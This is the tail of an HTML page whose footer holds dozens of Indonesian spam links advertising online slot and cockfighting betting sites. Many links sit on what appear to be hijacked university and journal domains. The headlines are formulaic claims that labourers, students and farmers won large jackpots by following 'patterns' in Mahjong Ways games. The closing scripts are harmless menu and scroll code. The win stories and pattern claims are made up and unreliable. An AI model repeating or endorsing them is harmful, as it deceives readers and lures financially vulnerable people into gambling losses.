            <p><a href="https://newsdaily-g5bhbpfrakasepbt.southeastasia-01.azurewebsites.net/supri-tukang-tambal-ban-di-jogja-dapat-jackpot.html">Supri Tukang Tambal Ban di Jogja Dapat Jackpot Rp205.300.000 dari Scatter Hitam Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/anak-kos-jogja-dapat-hp-baru-usai-pecahkan-pola-scatter-hitam-di-satgasjitu.html">Anak Kos Jogja Dapat HP Baru Usai Pecahkan Pola Scatter Hitam di SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/freelancer-desain-grafis-main-mahjong-ways-saat-lembur-scatter-muncul-di-satgasjitu.html">Freelancer Desain Grafis Main Mahjong Ways Saat Lembur, Scatter Muncul di SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/montir-cilacap-jackpot-mahjong-ways-setelah-pulang-kerja-via-satgasjitu.html">Montir Cilacap Jackpot Mahjong Ways Setelah Pulang Kerja via SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/pegawai-spbu-blitar-gabung-komunitas-satgasjitu-kini-sering-menang-mahjong-ways.html">Pegawai SPBU Blitar Gabung Komunitas SATGASJITU, Kini Sering Menang Mahjong Ways</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/pengusaha-ayam-geprek-konsisten-cuan-harian-mahjong-ways-3-berkat-trik-satgasjitu.html">Pengusaha Ayam Geprek Konsisten Cuan Harian Mahjong Ways 3 Berkat Trik SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/penjahit-bogor-bawa-pulang-rp89-juta-usai-spin-mahjong-ways-di-satgasjitu.html">Penjahit Bogor Bawa Pulang Rp89 Juta Usai Spin Mahjong Ways di SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/petani-temanggung-menang-besar-dari-spin-subuh-mahjong-ways-lewat-satgasjitu.html">Petani Temanggung Menang Besar dari Spin Subuh Mahjong Ways Lewat SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/santri-magelang-modal-rp50-ribu-scatter-hitam-tiba-tiba-turun-di-satgasjitu.html">Santri Magelang Modal Rp50 Ribu, Scatter Hitam Tiba-Tiba Turun di SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/satpam-tebet-menang-2-kali-beruntun-di-mahjong-ways-berkat-pola-satgasjitu.html">Satpam Tebet Menang 2 Kali Beruntun di Mahjong Ways Berkat Pola SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/tukang-las-surabaya-iseng-coba-pola-lama-scatter-hitam-tembus-via-satgasjitu.html">Tukang Las Surabaya Iseng Coba Pola Lama, Scatter Hitam Tembus via SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/warga-karawang-main-mahjong-ways-2-tengah-malam-tarik-rp142-juta-di-satgasjitu.html">Warga Karawang Main Mahjong Ways 2 Tengah Malam, Tarik Rp142 Juta di SATGASJITU</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/slotoppo-resmi-dirikan-komunitas-mahjong-ways-di-padang-fokus-pada-pola-harian.html">Slotoppo Resmi Dirikan Komunitas Mahjong Ways di Padang, Fokus pada Pola Harian</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/barista-shift-malam-jakarta-heran-scatter-hitam-turun-3-kali-berturut-di-slotoppo.html">Barista Shift Malam Jakarta Heran Scatter Hitam Turun 3 Kali Berturut di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/mahasiswa-teknik-surabaya-bongkar-pola-spin-cepat-mahjong-ways-3-di-slotoppo.html">Mahasiswa Teknik Surabaya Bongkar Pola Spin Cepat Mahjong Ways 3 di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/ob-bandung-putuskan-pensiun-usai-menang-mahjong-ways-lewat-slotoppo.html">OB Bandung Putuskan Pensiun Usai Menang Mahjong Ways Lewat SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/pemilik-hp-ram-2gb-tetap-bisa-menang-di-mahjong-ways-berkat-slotoppo.html">Pemilik HP RAM 2GB Tetap Bisa Menang di Mahjong Ways Berkat SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/pria-50-an-bukti-pola-lama-masih-ampuh-di-mahjong-ways-slotoppo.html">Pria 50-an Bukti Pola Lama Masih Ampuh di Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/satpam-hotel-main-mahjong-ways-saat-istirahat-cairkan-rp92-juta-di-slotoppo.html">Satpam Hotel Main Mahjong Ways Saat Istirahat, Cairkan Rp92 Juta di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/docs/setup_files/news/warga-lampung-main-mahjong-ways-tengah-malam-scatter-hitam-turun-via-slotoppo.html">Warga Lampung Main Mahjong Ways Tengah Malam, Scatter Hitam Turun via SLOTOPPO</a></p>
            <p>Terima kasih atas informasinya, sangat membantu! Kunjungi juga situs kami <a href="https://slotoppoid.cyou/" rel="dofollow">Slotoppo Link Situs Game Online Gacor Resmi</a></p>
            <p><a href="https://infrastructurelogistics.ca/">slotoppo</a> Link Bukan Bos Tapi Berani Boros Para Pemain Slotoppo</p>
            <p><a href="https://revitalcare.com.au/">SLOTOPPO88</a> : Link Membawa Keberutungan Dan Kebahagian</p>
            <p><a href="https://sanwajutaku-chukai.com/">SLOTOPPO88</a> : Link Yang setiap Hari Panen Di Cari Para Pemain Slotoppo Dengan Kemenangan Maxwin</p>
            <p><a href="https://kmaa26.com/news/tukang-las-surabaya-coba-iseng-spin-pola-lama.html">Tukang Las Surabaya: Coba Iseng Spin Pola Lama, Akhirnya Scatter Hitam Tembus SATGASJITU</a></p>
            <p><a href="https://jurnalptik.id/home/berita/pola-simpel-mahjong-wins-3-gopay178-pemain-betah-cuan-terus.html">pola simpel mahjong wins 3 gopay178 pemain betah cuan terus</a></p>
            <p><a href="https://jurnalptik.id/home/berita/strategi-keberhasilan-mahjong-ways-2-gopay178-scatter-turun-tanpa-henti.html">strategi keberhasilan mahjong ways 2 gopay178 scatter turun tanpa henti</a></p>
            <p><a href="https://jurnalptik.id/home/berita/petani-bogor-skill-pola-spin-mahjong-ways-2-gopay178-jp-125-juta.html">petani bogor skill pola spin mahjong ways 2 gopay178 jp 125 juta</a></p>
            <p><a href="https://jurnalptik.id/home/berita/lomba-17-agustus-joko-kediri-juara-mahjong-ways-2.html">lomba 17 agustus joko kediri juara mahjong ways 2</a></p>
            <p><a href="https://jurnalptik.id/home/berita/17-agustus-dodi-papua-kemenangan-maksimal-mahjong-ways-2-gopay178.html">17 agustus dodi papua kemenangan maksimal mahjong ways 2 gopay178</a></p>
            <p><a href="https://jurnalptik.id/home/berita/wild-bandito-petualangan-tengkorak-kejutan-jp-maksimal.html">wild bandito petualangan tengkorak kejutan jp maksimal</a></p>
            <p><a href="https://jurnalptik.id/home/berita/timnas-putri-indonesia-u20-gagal-kualifikasi-piala-asia-gopay178.html">timnas putri indonesia u20 gagal kualifikasi piala asia gopay178</a></p>
            <p><a href="https://jurnalptik.id/home/berita/modal-receh-mengguncang-mahjong-ways-2-bukti-keberuntungan.html">modal receh mengguncang mahjong ways 2 bukti keberuntungan</a></p>
            <p><a href="https://jurnalptik.id/home/berita/guru-ngaji-menangis-bahagia-rejeki-tak-terduga-mahjong-ways-2-gopay178.html">guru ngaji menangis bahagia rejeki tak terduga mahjong ways 2 gopay178</a></p>
            <p><a href="https://jurnalptik.id/home/berita/youtuber-reza-trik-pola-mahjong-ways-125-juta-masuk-rekening.html">youtuber reza trik pola mahjong ways 125 juta masuk rekening</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/buruh-harian-pontianak-dapat-scatter-hitam-5-kali-di-satgasjitu.html">Buruh Harian Pontianak Dapat Scatter Hitam 5 Kali di Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/guru-les-privat-cirebon-raih-jackpot-lewat-scatter-hitam-satgasjitu.html">Guru Les Privat Cirebon Raih Jackpot Lewat Scatter Hitam Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/mahasiswi-semarang-dapat-pola-spin-cepat-mahjong-ways-dari-satgasjitu.html">Mahasiswi Semarang Dapat Pola Spin Cepat Mahjong Ways dari Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/nelayan-pesisir-riau-raih-cuan-rp80-juta-di-mahjong-ways-satgasjitu.html">Nelayan Pesisir Riau Raih Cuan Rp80 Juta di Mahjong Ways Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pegawai-kantor-surabaya-menang-besar-di-mahjong-ways-via-satgasjitu.html">Pegawai Kantor Surabaya Menang Besar di Mahjong Ways via Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pemuda-mataram-gunakan-pola-satgasjitu--scatter-hitam-turun-4-kali.html">Pemuda Mataram Gunakan Pola Satgasjitu, Scatter Hitam Turun 4 Kali</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/petani-padi-lombok-utara-menang-cuan-dari-scatter-hitam-satgasjitu.html">Petani Padi Lombok Utara Menang Cuan dari Scatter Hitam Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/peternak-ayam-malang-menang-rp40-juta-di-mahjong-ways-satgasjitu.html">Peternak Ayam Malang Menang Rp40 Juta di Mahjong Ways Satgasjitu</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-bantu-ibu-kos-medan-temukan-pola-scatter-hitam-ampuh.html">Satgasjitu Bantu Ibu Kos Medan Temukan Pola Scatter Hitam Ampuh</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-bantu-pegawai-hotel-balikpapan-raih-jackpot-scatter-hitam.html">Satgasjitu Bantu Pegawai Hotel Balikpapan Raih Jackpot Scatter Hitam</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-bongkar-strategi-pemain-bali-menang-beruntun-di-scatter-hitam.html">Satgasjitu Bongkar Strategi Pemain Bali Menang Beruntun di Scatter Hitam</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-catat-kemenangan-pemuda-batam-berkat-scatter-hitam-mahjong-ways.html">Satgasjitu Catat Kemenangan Pemuda Batam Berkat Scatter Hitam Mahjong Ways</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-laporkan-pemain-banjarmasin-menang-besar-di-mahjong-ways.html">Satgasjitu Laporkan Pemain Banjarmasin Menang Besar di Mahjong Ways</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-umumkan-pola-baru-mahjong-ways-untuk-pemain-harian.html">Satgasjitu Umumkan Pola Baru Mahjong Ways untuk Pemain Harian</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/satgasjitu-umumkan-pola-malam-yang-picu-scatter-hitam-mahjong-ways.html">Satgasjitu Umumkan Pola Malam yang Picu Scatter Hitam Mahjong Ways</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/anak-kos-yogyakarta-sukses-cuan-berkat-scatter-hitam-di-slotoppo.html">Anak Kos Yogyakarta Sukses Cuan Berkat Scatter Hitam di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/barista-surabaya-menang-tengah-malam-usai-scatter-hitam-slotoppo.html">Barista Surabaya Menang Tengah Malam Usai Scatter Hitam SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/buruh-pabrik-tangerang-kantongi-rp50-juta-dari-mahjong-ways-slotoppo.html">Buruh Pabrik Tangerang Kantongi Rp50 Juta dari Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/ibu-rumah-tangga-bali-raih-cuan-dari-mahjong-ways-berkat-pola-slotoppo.html">Ibu Rumah Tangga Bali Raih Cuan dari Mahjong Ways Berkat Pola SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/mahasiswa-makassar-bongkar-rahasia-pola-harian-mahjong-ways-slotoppo.html">Mahasiswa Makassar Bongkar Rahasia Pola Harian Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/nelayan-jepara-pulang-bawa-cuan-besar-dari-scatter-hitam-slotoppo.html">Nelayan Jepara Pulang Bawa Cuan Besar dari Scatter Hitam SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pegawai-toko-bandung-menang-rp30-juta-di-mahjong-ways-slotoppo.html">Pegawai Toko Bandung Menang Rp30 Juta di Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pelajar-smk-dapat-jackpot-usai-scatter-hitam-4-kali-di-slotoppo.html">Pelajar SMK Dapat Jackpot Usai Scatter Hitam 4 Kali di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pemuda-aceh-menang-besar-usai-pola-lama-scatter-hitam-slotoppo.html">Pemuda Aceh Menang Besar Usai Pola Lama Scatter Hitam SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pemuda-bogor-menang-beruntun-di-mahjong-ways-3-lewat-slotoppo.html">Pemuda Bogor Menang Beruntun di Mahjong Ways 3 Lewat SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pengemudi-ojol-bekasi-raih-scatter-hitam-3-kali-di-slotoppo.html">Pengemudi Ojol Bekasi Raih Scatter Hitam 3 Kali di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/penjaga-parkir-medan-dapat-kemenangan-beruntun-di-mahjong-ways-slotoppo.html">Penjaga Parkir Medan Dapat Kemenangan Beruntun di Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/petani-kopi-lampung-temukan-pola-scatter-hitam-di-slotoppo.html">Petani Kopi Lampung Temukan Pola Scatter Hitam di SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/pria-kalimantan-tengah-temukan-pola-spin-ajaib-mahjong-ways-slotoppo.html">Pria Kalimantan Tengah Temukan Pola Spin Ajaib Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://pemas.unisla.ac.id/pages/assets/news/sopir-travel-pekanbaru-menang-besar-usai-scatter-hitam-muncul-di-slotoppo.html">Sopir Travel Pekanbaru Menang Besar Usai Scatter Hitam Muncul di SLOTOPPO</a></p>
            <p><a href="https://www.predictivelabs.com/">SLOTOPPO Situs Sabung Ayam Online SV388 Online 24 jam Terpercaya</a></p>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const navToggle = document.querySelector('.nav-toggle');
            const navMenu = document.querySelector('.nav-menu');

            navToggle.addEventListener('click', function() {
                navMenu.classList.toggle('open');
            });

            const submenuToggles = document.querySelectorAll('header nav ul li');

            submenuToggles.forEach(function(submenuToggle) {
                submenuToggle.addEventListener('mouseenter', function() {
                    const submenu = this.querySelector('.submenu');
                    if (submenu) {
                        submenu.style.display = 'block';
                    }
                });

                submenuToggle.addEventListener('mouseleave', function() {
                    const submenu = this.querySelector('.submenu');
                    if (submenu) {
                        submenu.style.display = 'none';
                    }
                });
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('.btn-secondary').forEach(button => {
                button.addEventListener('click', function(event) {
                    event.preventDefault();
                    document.querySelector('#request-quote').scrollIntoView({
                        behavior: 'smooth'
                    });
                });
            });
        });
    </script>




    <script src="script.js"></script>
</body>

</html>